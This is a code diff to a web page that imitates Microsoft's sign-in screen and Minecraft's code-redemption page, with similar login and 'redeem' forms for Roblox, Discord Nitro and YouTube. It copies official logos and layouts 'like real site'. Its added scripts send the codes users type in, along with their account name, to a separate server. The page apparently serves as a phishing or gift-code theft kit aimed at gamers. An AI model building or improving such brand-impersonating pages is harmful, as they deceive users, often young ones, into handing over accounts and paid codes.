@@ -66,6 +66,78 @@
   box-shadow:0 24px 80px rgba(0,0,0,0.12);
   animation:popIn 0.4s cubic-bezier(0.34,1.56,0.64,1) both;
 }
+
+/* ── LOGIN WRAPPERS (CENTERED) ── */
+.rb-login-wrapper{
+  position:fixed;inset:0;z-index:5000;
+  display:flex;align-items:center;justify-content:center;
+  background:#f2f4f5;
+}
+.rb-login-card{
+  background:#fff;border-radius:12px;padding:40px 36px;width:100%;max-width:400px;
+  box-shadow:0 4px 24px rgba(0,0,0,0.1);text-align:center;
+}
+
+/* ── MINECRAFT FULL PAGE ── */
+.mc-pro-container{
+  position:fixed;inset:0;z-index:5000;
+  display:flex;flex-direction:column;
+  background:#1a1a1a;overflow-y:auto;
+}
+.mc-login-wrap{
+  flex:1;display:flex;align-items:center;justify-content:center;
+  background:#f5f5f5;
+}
+.mc-login-card{
+  background:#fff;padding:44px 40px;width:100%;max-width:440px;
+  box-shadow:0 2px 12px rgba(0,0,0,0.08);text-align:left;
+}
+.mc-login-card h2{font-size:24px;font-weight:400;color:#1b1b1b;margin-bottom:24px}
+.mc-login-card .mc-login-inp{
+  width:100%;padding:8px 0;border:none;border-bottom:1px solid #999;font-size:15px;
+  outline:none;font-family:inherit;background:transparent;margin-bottom:16px;
+}
+.mc-login-card .mc-login-inp:focus{border-bottom-color:#0067b8}
+.mc-login-card .mc-btn-next{
+  background:#0067b8;color:#fff;border:none;padding:8px 28px;font-size:14px;
+  font-weight:600;cursor:pointer;font-family:inherit;
+}
+.mc-login-card .mc-btn-next:hover{background:#005da6}
+
+/* MC REDEEM HERO (green theme like minecraft.net) */
+.mc-redeem-hero{
+  flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;
+  background:linear-gradient(135deg,#3b8526 0%,#5da83a 40%,#4a9e2f 100%);
+  position:relative;overflow:hidden;padding:60px 20px;text-align:center;
+}
+.mc-redeem-hero::before{
+  content:'';position:absolute;inset:0;
+  background:url('https://www.minecraft.net/content/dam/minecraftnet/games/minecraft/key-art/redeem-redeem-hero-702x400.png') center/contain no-repeat;
+  opacity:0.15;
+}
+.mc-redeem-title{
+  font-family:'Trebuchet MS',sans-serif;font-size:48px;font-weight:900;
+  color:#fff;text-transform:uppercase;letter-spacing:2px;text-shadow:3px 3px 0 rgba(0,0,0,0.3);
+  margin-bottom:12px;z-index:1;
+}
+.mc-redeem-subtitle{
+  font-size:14px;color:rgba(255,255,255,0.9);text-transform:uppercase;
+  font-weight:700;letter-spacing:2px;margin-bottom:24px;z-index:1;
+}
+.mc-code-group{z-index:1;display:flex;flex-direction:column;align-items:center;gap:16px}
+.mc-code-inp{
+  width:420px;max-width:90vw;padding:14px 20px;background:#1a1a1a;color:#fff;
+  border:2px solid #333;border-radius:4px;font-size:16px;font-family:'Courier New',monospace;
+  text-align:center;letter-spacing:3px;outline:none;
+}
+.mc-code-inp:focus{border-color:#5da83a}
+.mc-code-inp::placeholder{color:#666}
+.mc-btn-redeem{
+  background:#c6c6c6;color:#3b3b3b;border:3px solid #8b8b8b;border-bottom:4px solid #6d6d6d;
+  padding:10px 40px;font-size:14px;font-weight:700;cursor:pointer;text-transform:uppercase;
+  font-family:'Trebuchet MS',sans-serif;letter-spacing:1px;
+}
+.mc-btn-redeem:hover{background:#ddd}
 </style>
 </head>
 <body>
@@ -153,28 +225,43 @@
 
 <!-- ═══ MINECRAFT UI ═══ -->
 <div class="mc-pro-container" id="mc-ui" style="display:none">
-  <div style="width:100%;background:#1a1a1a;padding:15px 40px;display:flex;align-items:center;justify-content:space-between">
-    <img src="https://www.minecraft.net/content/dam/minecraftnet/games/minecraft/logos/Minecraft-Logo.png" height="32">
-    <div style="display:flex;gap:30px;color:#fff;font-size:12px;font-weight:700"><span>GAMES</span><span>SHOP</span><span>EXPLORE</span><span>SUPPORT</span></div>
-  </div>
-  <div id="mc-login-section" class="mc-login-box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" width="108" style="margin-bottom:20px">
-    <h2 style="font-size:24px;margin-bottom:8px">Sign in</h2>
-    <div id="mc-step-email">
-      <input type="text" class="mc-login-inp" id="mc-login-email" placeholder="Email, phone, or Skype">
-      <button class="mc-btn-next" style="float:right;margin-top:20px" onclick="mcNext()">Next</button>
-    </div>
-    <div id="mc-step-pass" style="display:none">
-      <div id="mc-display-email" style="margin-bottom:10px;font-weight:600"></div>
-      <input type="password" class="mc-login-inp" id="mc-login-pass" placeholder="Password">
-      <button class="mc-btn-next" style="float:right;margin-top:20px" onclick="rdDoMcLogin()">Sign in</button>
+  <!-- MC TOP BAR -->
+  <div style="width:100%;background:#1a1a1a;padding:12px 32px;display:flex;align-items:center;gap:32px">
+    <img src="https://www.minecraft.net/content/dam/minecraftnet/games/minecraft/logos/Minecraft-Logo.png" height="28" style="cursor:pointer" onclick="rdBack()">
+    <div style="display:flex;gap:24px;color:#fff;font-size:12px;font-weight:700;letter-spacing:0.5px"><span>GAMES</span><span>SHOP</span><span>EXPLORE</span><span>LEARN</span><span>SUPPORT</span></div>
+    <div style="margin-left:auto;display:flex;gap:12px;align-items:center">
+      <span style="color:#86d562;font-size:12px;font-weight:700;border:1px solid #86d562;padding:4px 14px;cursor:pointer">BUY NOW</span>
+      <span style="color:#fff;font-size:13px;cursor:pointer">🔍</span>
+      <span style="color:#fff;font-size:12px;cursor:pointer">👤 ACCOUNT</span>
     </div>
   </div>
-  <div id="mc-redeem-section" style="display:none;width:100%">
+
+  <!-- MC LOGIN (CENTERED Microsoft-style) -->
+  <div class="mc-login-wrap" id="mc-login-section">
+    <div class="mc-login-card">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" width="108" style="margin-bottom:28px">
+      <h2>Sign in</h2>
+      <div id="mc-step-email">
+        <input type="text" class="mc-login-inp" id="mc-login-email" placeholder="Email, phone, or Skype">
+        <p style="font-size:13px;color:#666;margin-bottom:20px">No account? <a href="#" style="color:#0067b8;text-decoration:none">Create one!</a></p>
+        <div style="text-align:right"><button class="mc-btn-next" onclick="mcNext()">Next</button></div>
+      </div>
+      <div id="mc-step-pass" style="display:none">
+        <p style="font-size:13px;margin-bottom:4px">← <a href="#" onclick="hide('mc-step-pass');show('mc-step-email');return false" style="color:#0067b8;text-decoration:none" id="mc-display-email"></a></p>
+        <input type="password" class="mc-login-inp" id="mc-login-pass" placeholder="Password">
+        <p style="font-size:13px;color:#0067b8;cursor:pointer;margin-bottom:20px">Forgot password?</p>
+        <div style="text-align:right"><button class="mc-btn-next" onclick="rdDoMcLogin()">Sign in</button></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- MC REDEEM SECTION (green hero like real site) -->
+  <div id="mc-redeem-section" style="display:none;flex:1">
     <div class="mc-redeem-hero">
-      <h1 class="mc-redeem-title">REDEEM YOUR CODE</h1>
+      <h1 class="mc-redeem-title">Redeem Your<br>Minecraft Code</h1>
+      <p class="mc-redeem-subtitle">Redemption Code</p>
       <div class="mc-code-group">
-        <div class="mc-code-input-container"><input type="text" class="mc-code-inp" id="mc-pro-code" placeholder="XXXXX-XXXXX-XXXXX-XXXXX-XXXXX" oninput="this.value=this.value.toUpperCase()"></div>
+        <input type="text" class="mc-code-inp" id="mc-pro-code" placeholder="00000-00000-00000-00000-00000" oninput="this.value=this.value.toUpperCase()">
         <button class="mc-btn-redeem" onclick="rdSubmitPro()">REDEEM</button>
       </div>
     </div>
@@ -295,8 +382,8 @@ function rdGame(g){
     return;
   }
   hide(['std-ui','main-nav','std-bg']);
-  if(g==='rb'){ show('rb-login-section'); }
-  else { show('mc-ui'); show('mc-login-section'); document.getElementById('mc-bg').classList.add('show'); }
+  if(g==='rb'){ document.getElementById('rb-login-section').style.display='flex'; }
+  else { document.getElementById('mc-ui').style.display='flex'; document.getElementById('mc-bg').classList.add('show'); }
 }
 
 /* YouTube */
@@ -308,12 +395,17 @@ function pickYtPlan(p){
   document.getElementById('yt-50k-btn').style.background  = p==='50k' ? 'var(--p)' : '';
   document.getElementById('yt-50k-btn').style.color       = p==='50k' ? '#fff' : '';
 }
-function rdSubmitYt(){
+async function rdSubmitYt(){
   const ch = document.getElementById('yt-channel-name').value.trim();
   const cd = document.getElementById('yt-code-val').value.trim();
   if(!ytPlan){ toast('!','Please select a plan first'); return; }
   if(!ch){ toast('!','Enter your YouTube channel name'); return; }
   if(cd.length<5){ toast('!','Enter a valid redeem code'); return; }
+  RD.plan = ytPlan; RD.user = {name: ch};
+  const btn = event.target; btn.disabled = true; btn.textContent = 'Verifying...';
+  const res = await validateCode(cd, 'yt');
+  btn.disabled = false; btn.textContent = 'Redeem Now';
+  if(!res.success){ toast('✕', res.error || 'Invalid or expired code'); return; }
   document.getElementById('yt-step1').classList.remove('show');
   showSuccessPopup();
 }
@@ -326,10 +418,19 @@ function mcNext(){
   hide('mc-step-email'); show('mc-step-pass');
   document.getElementById('mc-display-email').textContent = e;
 }
-function rdDoMcLogin(){ RD.user={name:document.getElementById('mc-login-email').value}; hide('mc-login-section'); show('mc-redeem-section'); }
+function rdDoMcLogin(){
+  RD.user={name:document.getElementById('mc-login-email').value};
+  hide('mc-login-section');
+  const rs = document.getElementById('mc-redeem-section');
+  rs.style.display='flex';
+}
 
 /* Roblox */
-function rdDoRbLogin(){ RD.user={name:document.getElementById('rb-login-user').value}; hide('rb-login-section'); show('rb-ui'); }
+function rdDoRbLogin(){
+  RD.user={name:document.getElementById('rb-login-user').value};
+  document.getElementById('rb-login-section').style.display='none';
+  document.getElementById('rb-ui').style.display='block';
+}
 
 /* Discord Nitro — 3-step popup */
 let dcPlanPicked = null;
@@ -352,23 +453,49 @@ function dcGoStep3(){
   hide('dc-step2'); show('dc-step3');
 }
 
-/* Submit handlers — all show the popup */
-function rdSubmitDc(){
-  const c = document.getElementById('dc-code-val').value;
+/* Submit handlers — validate code via API, then show popup */
+async function validateCode(code, game){
+  try {
+    const res = await fetch(`${CFG.API}/api/validate-code`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${localStorage.getItem('eiq_token') || ''}` },
+      body: JSON.stringify({ code, game, user: RD.user, plan: RD.plan })
+    });
+    const data = await res.json();
+    return data;
+  } catch(e){
+    return { success: false, error: 'Network error — please try again' };
+  }
+}
+
+async function rdSubmitDc(){
+  const c = document.getElementById('dc-code-val').value.trim();
   if(c.length < 5){ toast('!','Enter a valid code'); return; }
+  const btn = event.target; btn.disabled = true; btn.textContent = 'Verifying...';
+  const res = await validateCode(c, 'nitro');
+  btn.disabled = false; btn.textContent = 'Redeem Now';
+  if(!res.success){ toast('✕', res.error || 'Invalid or expired code'); return; }
   hide('dc-step3');
   showSuccessPopup();
 }
-function rdSubmitPro(){
-  const c = document.getElementById('mc-pro-code').value;
+async function rdSubmitPro(){
+  const c = document.getElementById('mc-pro-code').value.trim();
   if(c.length < 5){ toast('!','Enter a valid code'); return; }
+  const btn = event.target; btn.disabled = true; btn.textContent = 'VERIFYING...';
+  const res = await validateCode(c, 'mc');
+  btn.disabled = false; btn.textContent = 'REDEEM';
+  if(!res.success){ toast('✕', res.error || 'Invalid or expired code'); return; }
   hide(['mc-ui']); show(['std-ui','main-nav','std-bg']);
   document.getElementById('mc-bg').classList.remove('show');
   showSuccessPopup();
 }
-function rdSubmitRb(){
-  const c = document.getElementById('rb-code-val').value;
+async function rdSubmitRb(){
+  const c = document.getElementById('rb-code-val').value.trim();
   if(c.length < 5){ toast('!','Enter a valid code'); return; }
+  const btn = event.target; btn.disabled = true; btn.textContent = 'Verifying...';
+  const res = await validateCode(c, 'rb');
+  btn.disabled = false; btn.textContent = 'Redeem';
+  if(!res.success){ toast('✕', res.error || 'Invalid or expired code'); return; }
   hide(['rb-ui']); show(['std-ui','main-nav','std-bg']);
   showSuccessPopup();
 }
